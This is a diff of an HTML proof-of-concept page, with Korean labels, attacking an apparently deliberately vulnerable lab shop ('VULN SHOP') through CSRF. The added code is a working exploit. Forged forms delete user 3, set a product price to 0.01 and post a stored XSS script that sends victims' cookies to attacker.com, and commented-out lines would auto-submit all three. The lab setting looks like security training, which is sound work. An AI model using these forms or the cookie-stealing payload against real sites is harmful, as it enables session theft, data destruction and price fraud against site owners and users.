@@ -1,33 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF PoC - User Deletion</title>
+    <title>CSRF PoC - VULN SHOP</title>
 </head>
 <body>
-    <h1>CSRF Proof of Concept</h1>
-    <p>This page demonstrates CSRF vulnerability in VULN SHOP admin panel.</p>
-    <p>When a logged-in admin visits this page, user ID 3 will be deleted automatically.</p>
+    <h1>CSRF 공격 PoC</h1>
+    <p>이 페이지를 열면 자동으로 공격이 실행됩니다.</p>
 
-    <!-- Auto-submit form for user deletion -->
-    <form id="csrf-form" action="http://10.210.136.53:3000/admin/users/3/delete" method="POST">
-        <input type="hidden" name="confirm" value="true" />
+    <!-- 1. 사용자 삭제 CSRF -->
+    <h2>1. 사용자 삭제 공격</h2>
+    <form id="deleteUser" action="http://192.168.0.28:3000/admin/users/3/delete" method="POST">
+        <input type="submit" value="Delete User 3">
+    </form>
+
+    <!-- 2. 상품 가격 변경 CSRF -->
+    <h2>2. 상품 가격 변경 공격</h2>
+    <form id="changePrice" action="http://192.168.0.28:3000/admin/products/1" method="POST">
+        <input type="hidden" name="name" value="OVERSIZED HOODIE">
+        <input type="hidden" name="price" value="0.01">
+        <input type="hidden" name="description" value="Hacked!">
+        <input type="submit" value="Change Price to $0.01">
+    </form>
+
+    <!-- 3. XSS 게시물 작성 CSRF -->
+    <h2>3. XSS 게시물 자동 작성</h2>
+    <form id="postXSS" action="http://192.168.0.28:3000/board" method="POST">
+        <input type="hidden" name="content" value="<script>document.location='http://attacker.com/steal?c='+document.cookie</script>">
+        <input type="submit" value="Post XSS">
     </form>
 
     <script>
-        // Uncomment to auto-submit
-        // document.getElementById('csrf-form').submit();
+        // 자동 실행 (주석 해제하면 자동 공격)
+        // document.getElementById('deleteUser').submit();
+        // document.getElementById('changePrice').submit();
+        // document.getElementById('postXSS').submit();
     </script>
 
-    <h2>Manual Test Button</h2>
-    <button onclick="document.getElementById('csrf-form').submit()">Delete User ID 3</button>
-
     <hr>
-    <h2>Other CSRF Targets</h2>
+    <h2>설명</h2>
+    <p>
+        VULN SHOP은 CSRF 토큰을 사용하지 않습니다.<br>
+        피해자가 이 페이지를 방문하면 관리자 권한으로 다음 공격이 가능합니다:
+    </p>
     <ul>
-        <li>POST /admin/products/{id} - Modify product prices</li>
-        <li>POST /admin/users/{id}/delete - Delete any user</li>
-        <li>POST /profile/upload - Upload malicious files</li>
-        <li>POST /board - Post XSS payloads</li>
+        <li>다른 사용자 계정 삭제</li>
+        <li>상품 가격 임의 변경</li>
+        <li>악성 게시물 자동 작성</li>
     </ul>
 </body>
 </html>
